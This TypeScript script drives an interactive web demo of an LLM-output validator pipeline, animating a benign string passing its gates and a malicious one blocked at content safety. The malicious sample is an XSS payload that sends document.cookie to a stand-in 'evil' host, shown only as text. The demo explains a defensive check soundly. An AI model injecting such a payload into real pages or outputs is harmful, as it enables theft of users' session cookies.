// Validator pipeline: runs a benign or malicious (Lenovo-style XSS) LLM output
// through the deterministic gates, animating the beam and blocking at content safety.
  const root = document.querySelector<HTMLElement>('[data-vp]')
  if (root) {
    root.classList.add('is-interactive')
    const gates = [...root.querySelectorAll<HTMLElement>('[data-vp-gate]')]
    const exit = root.querySelector<HTMLElement>('[data-vp-exit]')!
    const beam = root.querySelector<HTMLElement>('[data-vp-beam]')!
    const payload = root.querySelector<HTMLElement>('[data-vp-payload]')!
    const status = root.querySelector<HTMLElement>('[data-vp-status]')!
    const statusText = root.querySelector<HTMLElement>('[data-vp-status-text]')!
    const tabs = [...root.querySelectorAll<HTMLButtonElement>('[data-vp-mode]')]
    const reduce = matchMedia('(prefers-reduced-motion: reduce)').matches

    const BENIGN = 'Refund window is 30 days from purchase.'
    const EVIL = '<img src=x onerror="fetch(\'//evil/?c=\'+document.cookie)">'
    let token = 0

    const clear = () => {
      gates.forEach((g) => g.classList.remove('pass', 'block'))
      exit.classList.remove('ship')
      status.className =
        'vp-status m-0 mt-4 flex items-center gap-2 px-3 py-2 border font-mono text-mono-xs border-border-dark text-text-muted'
    }

    const run = (mode: string) => {
      const myToken = ++token
      clear()
      payload.textContent = mode === 'malicious' ? EVIL : BENIGN
      const blockAt = mode === 'malicious' ? 3 : -1 // content-safety gate index
      const reachPct = blockAt === -1 ? 100 : ((blockAt + 1) / (gates.length + 1)) * 100
      beam.style.transform = 'scaleX(0)'
      // next frame so the transition runs
      requestAnimationFrame(() => (beam.style.transform = `scaleX(${reachPct / 100})`))

      const stepMs = reduce ? 0 : 320
      gates.forEach((g, i) => {
        window.setTimeout(() => {
          if (myToken !== token) return
          if (i === blockAt) {
            g.classList.add('block')
            g.querySelector('.vp-gate-mark')!.textContent = '✗'
            status.classList.add('border-error', 'text-error')
            statusText.textContent =
              'BLOCKED at content safety. HTML/script stripped before render; the Lenovo XSS never ships.'
          } else if (blockAt === -1 || i < blockAt) {
            g.classList.add('pass')
            g.querySelector('.vp-gate-mark')!.textContent = '✓'
          }
        }, stepMs * (i + 1))
      })

      if (blockAt === -1) {
        window.setTimeout(
          () => {
            if (myToken !== token) return
            exit.classList.add('ship')
            status.classList.add('border-success')
            statusText.textContent = 'All validators passed. Safe to ship.'
          },
          stepMs * (gates.length + 1),
        )
      }
    }

    tabs.forEach((tab) =>
      tab.addEventListener('click', () => {
        tabs.forEach((t) => {
          t.classList.remove('vp-tab-on')
          t.setAttribute('aria-pressed', 'false')
        })
        tab.classList.add('vp-tab-on')
        tab.setAttribute('aria-pressed', 'true')
        run(tab.dataset.vpMode!)
      }),
    )

    // auto-run the malicious case once it scrolls into view
    const io = new IntersectionObserver(
      (entries, obs) => {
        for (const e of entries) {
          if (e.isIntersecting) {
            obs.disconnect()
            tabs.find((t) => t.dataset.vpMode === 'malicious')?.click()
          }
        }
      },
      { threshold: 0.4 },
    )
    io.observe(root)
  }

export {}
